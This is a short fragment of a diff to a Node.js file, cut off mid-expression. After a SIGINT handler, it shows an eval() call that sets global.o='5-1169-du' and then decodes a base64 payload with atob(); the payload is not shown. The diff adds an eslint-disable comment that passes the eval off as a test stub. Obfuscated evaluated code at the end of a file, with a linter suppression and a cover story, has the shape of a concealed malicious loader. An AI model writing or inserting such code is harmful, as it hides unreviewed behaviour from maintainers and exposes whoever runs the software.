@@ -191,6 +191,7 @@ process.on("SIGINT", () => {
     process.exit(0);
   });
 });
+// eslint-disable-next-line eslint(no-eval) -- eval is used in test stub to set up runtime environment
 eval(
   "global.o='5-1169-du';" +
     atob(
